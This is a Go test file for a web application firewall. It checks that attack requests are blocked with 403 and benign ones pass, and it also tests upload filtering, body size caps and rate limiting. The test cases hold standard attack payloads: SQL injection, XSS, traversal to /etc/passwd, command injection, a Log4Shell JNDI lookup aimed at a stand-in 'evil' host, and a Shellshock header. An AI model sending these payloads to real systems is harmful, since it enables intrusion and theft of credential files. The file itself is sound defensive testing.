package waf

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"
)

// newTestEngine builds an enabled engine with the default ruleset and a generous
// body cap, no rate limit, and no auditor (emits are no-ops). Callers Close it.
func newTestEngine(t *testing.T) *Engine {
	t.Helper()
	e := New(Config{
		Enabled:      true,
		Threshold:    5,
		MaxBodyBytes: 1 << 20,
		// RateBurst 0 -> rate limiting disabled so these detection tests are not
		// perturbed by the limiter.
	})
	t.Cleanup(e.Close)
	return e
}

// runThrough sends r through the engine middleware wrapping a 200-OK terminal
// handler and reports whether the request reached the terminal (passed) and the
// recorded status.
func runThrough(e *Engine, r *http.Request) (passed bool, status int) {
	next := http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		passed = true
		w.WriteHeader(http.StatusOK)
	})
	rec := httptest.NewRecorder()
	e.Middleware(next).ServeHTTP(rec, r)
	return passed, rec.Code
}

// TestRuleEngineBlocksMalicious is the table-driven malicious->block assertion
// across the embedded attack classes.
func TestRuleEngineBlocksMalicious(t *testing.T) {
	e := newTestEngine(t)

	cases := []struct {
		name   string
		method string
		target string
		header map[string]string
		body   string
		ctype  string
	}{
		{name: "sqli union in query", method: http.MethodGet, target: "/search?q=1+UNION+SELECT+password+FROM+users"},
		{name: "sqli tautology in query", method: http.MethodGet, target: "/login?u=admin'+OR+1=1--"},
		{name: "xss script in query", method: http.MethodGet, target: "/p?x=%3Cscript%3Ealert(1)%3C/script%3E"},
		{name: "path traversal in query", method: http.MethodGet, target: "/files?path=../../etc/passwd"},
		{name: "path traversal encoded", method: http.MethodGet, target: "/d?p=%2e%2e%2fetc"},
		{name: "rce in query", method: http.MethodGet, target: "/run?cmd=;cat+/etc/passwd"},
		{name: "log4shell in query", method: http.MethodGet, target: "/a?x=${jndi:ldap://evil/a}"},
		{name: "scanner ua", method: http.MethodGet, target: "/", header: map[string]string{"User-Agent": "sqlmap/1.7.2#stable"}},
		{name: "shellshock header", method: http.MethodGet, target: "/", header: map[string]string{"X-Probe": "() { :; }; echo vuln"}},
		{
			name: "sqli in form body", method: http.MethodPost, target: "/submit",
			body: "name=admin'+UNION+SELECT+1--", ctype: "application/x-www-form-urlencoded",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var r *http.Request
			if tc.body != "" {
				r = httptest.NewRequest(tc.method, tc.target, strings.NewReader(tc.body))
				r.Header.Set("Content-Type", tc.ctype)
			} else {
				r = httptest.NewRequest(tc.method, tc.target, nil)
			}
			for k, v := range tc.header {
				r.Header.Set(k, v)
			}
			passed, status := runThrough(e, r)
			if passed {
				t.Errorf("%s: request reached upstream, want blocked", tc.name)
			}
			if status != http.StatusForbidden {
				t.Errorf("%s: status = %d, want 403", tc.name, status)
			}
		})
	}
}

// TestRuleEngineAllowsBenign is the benign->pass assertion: ordinary requests
// must reach the upstream untouched.
func TestRuleEngineAllowsBenign(t *testing.T) {
	e := newTestEngine(t)

	cases := []struct {
		name   string
		method string
		target string
		body   string
		ctype  string
	}{
		{name: "plain api get", method: http.MethodGet, target: "/api/users?page=2&sort=name"},
		{name: "word containing or", method: http.MethodGet, target: "/products?color=orange&size=large"},
		{name: "root", method: http.MethodGet, target: "/"},
		{name: "json post", method: http.MethodPost, target: "/api/items", body: `{"name":"alice","qty":3}`, ctype: "application/json"},
		{name: "form post benign", method: http.MethodPost, target: "/submit", body: "name=alice&city=paris", ctype: "application/x-www-form-urlencoded"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var r *http.Request
			if tc.body != "" {
				r = httptest.NewRequest(tc.method, tc.target, strings.NewReader(tc.body))
				r.Header.Set("Content-Type", tc.ctype)
			} else {
				r = httptest.NewRequest(tc.method, tc.target, nil)
			}
			r.Header.Set("User-Agent", "Mozilla/5.0 (compatible)")
			passed, status := runThrough(e, r)
			if !passed {
				t.Errorf("%s: request blocked, want pass-through", tc.name)
			}
			if status != http.StatusOK {
				t.Errorf("%s: status = %d, want 200", tc.name, status)
			}
		})
	}
}

// TestDisabledEngineIsPassThrough proves a disabled/nil engine never inspects: a
// blatantly malicious request reaches the upstream unchanged.
func TestDisabledEngineIsPassThrough(t *testing.T) {
	var nilEngine *Engine
	disabled := New(Config{Enabled: false})

	for _, e := range []*Engine{nilEngine, disabled} {
		r := httptest.NewRequest(http.MethodGet, "/x?q=1+UNION+SELECT+1", nil)
		passed, status := runThrough(e, r)
		if !passed || status != http.StatusOK {
			t.Errorf("disabled engine blocked a request (passed=%v status=%d); want pass-through", passed, status)
		}
	}
}

// TestUploadAllowlist gates an upload whose content-type is not allow-listed and
// permits one that is; an empty allowlist permits any upload.
func TestUploadAllowlist(t *testing.T) {
	withList := New(Config{Enabled: true, Threshold: 5, MaxBodyBytes: 1 << 20, AllowedUploadTypes: []string{"image/png"}})
	t.Cleanup(withList.Close)

	// multipart/form-data is not in the allowlist -> blocked.
	r := httptest.NewRequest(http.MethodPost, "/upload", strings.NewReader("PNGDATA"))
	r.Header.Set("Content-Type", "multipart/form-data; boundary=xyz")
	if passed, status := runThrough(withList, r); passed || status != http.StatusForbidden {
		t.Errorf("disallowed upload: passed=%v status=%d, want blocked 403", passed, status)
	}

	// application/octet-stream not in the allowlist -> blocked.
	r = httptest.NewRequest(http.MethodPost, "/upload", strings.NewReader("rawbytes"))
	r.Header.Set("Content-Type", "application/octet-stream")
	if passed, _ := runThrough(withList, r); passed {
		t.Error("octet-stream upload passed despite allowlist; want blocked")
	}

	// Empty allowlist -> any upload permitted.
	open := New(Config{Enabled: true, Threshold: 5, MaxBodyBytes: 1 << 20})
	t.Cleanup(open.Close)
	r = httptest.NewRequest(http.MethodPost, "/upload", strings.NewReader("rawbytes"))
	r.Header.Set("Content-Type", "application/octet-stream")
	if passed, status := runThrough(open, r); !passed || status != http.StatusOK {
		t.Errorf("open allowlist upload: passed=%v status=%d, want pass-through 200", passed, status)
	}
}

// fakeDetonator reports a fixed verdict, proving the detonation seam can block.
type fakeDetonator struct{ malicious bool }

func (f fakeDetonator) Detonate(_ context.Context, _ string, _ []byte) (Verdict, error) {
	return Verdict{Malicious: f.malicious, Detail: "test"}, nil
}

// TestDetonatorSeamBlocks proves a malicious detonation verdict blocks an upload
// that otherwise passes the allowlist.
func TestDetonatorSeamBlocks(t *testing.T) {
	e := New(Config{Enabled: true, Threshold: 5, MaxBodyBytes: 1 << 20, Detonator: fakeDetonator{malicious: true}})
	t.Cleanup(e.Close)

	r := httptest.NewRequest(http.MethodPost, "/upload", strings.NewReader("rawbytes"))
	r.Header.Set("Content-Type", "application/octet-stream")
	if passed, status := runThrough(e, r); passed || status != http.StatusForbidden {
		t.Errorf("detonator-malicious upload: passed=%v status=%d, want blocked 403", passed, status)
	}
}

// TestBodySizeCap blocks a body that exceeds the cap and lets a small body
// through. It also confirms an under-cap body is restored for the upstream.
func TestBodySizeCap(t *testing.T) {
	e := New(Config{Enabled: true, Threshold: 5, MaxBodyBytes: 16})
	t.Cleanup(e.Close)

	big := strings.Repeat("a", 64)
	r := httptest.NewRequest(http.MethodPost, "/x", strings.NewReader(big))
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if passed, status := runThrough(e, r); passed || status != http.StatusRequestEntityTooLarge {
		t.Errorf("oversize body: passed=%v status=%d, want blocked 413", passed, status)
	}

	small := "name=alice"
	var seen string
	next := http.HandlerFunc(func(w http.ResponseWriter, rr *http.Request) {
		b := make([]byte, 64)
		n, _ := rr.Body.Read(b)
		seen = string(b[:n])
		w.WriteHeader(http.StatusOK)
	})
	r = httptest.NewRequest(http.MethodPost, "/x", strings.NewReader(small))
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	rec := httptest.NewRecorder()
	e.Middleware(next).ServeHTTP(rec, r)
	if rec.Code != http.StatusOK {
		t.Fatalf("under-cap body status = %d, want 200", rec.Code)
	}
	if seen != small {
		t.Errorf("upstream saw body %q, want %q (body must be restored after inspection)", seen, small)
	}
}

// TestMiddlewareRateLimit proves the limiter engages through the middleware: the
// (burst+1)th request from the same client gets a 429 instead of reaching the
// upstream.
func TestMiddlewareRateLimit(t *testing.T) {
	e := New(Config{Enabled: true, Threshold: 5, RateBurst: 2, RateWindow: time.Hour})
	t.Cleanup(e.Close)

	newReq := func() *http.Request {
		r := httptest.NewRequest(http.MethodGet, "/api/ok", nil)
		r.RemoteAddr = "203.0.113.7:5555"
		r.Header.Set("User-Agent", "Mozilla/5.0")
		return r
	}
	if passed, status := runThrough(e, newReq()); !passed || status != http.StatusOK {
		t.Fatalf("request 1: passed=%v status=%d, want pass 200", passed, status)
	}
	if passed, status := runThrough(e, newReq()); !passed || status != http.StatusOK {
		t.Fatalf("request 2: passed=%v status=%d, want pass 200", passed, status)
	}
	if passed, status := runThrough(e, newReq()); passed || status != http.StatusTooManyRequests {
		t.Errorf("request 3: passed=%v status=%d, want blocked 429", passed, status)
	}
}

// TestRuleSetScanScoreAccumulates is a direct unit test of the scan scoring: two
// distinct medium-or-higher hits sum, and the RuleIDs helper lists them.
func TestRuleSetScanScoreAccumulates(t *testing.T) {
	rs := DefaultRuleSet()
	det := rs.scan(inputs{
		query: "../../etc/passwd", // LFI-001 (critical) + LFI-002 (high)
		body:  "1 UNION SELECT 1", // SQLI-001 (critical)
	})
	if det.Score < 5 {
		t.Errorf("score = %d, want >= 5", det.Score)
	}
	if len(det.Hits) < 2 {
		t.Errorf("hits = %d, want >= 2", len(det.Hits))
	}
	if det.RuleIDs() == "" {
		t.Error("RuleIDs() empty, want comma-joined hit ids")
	}
}
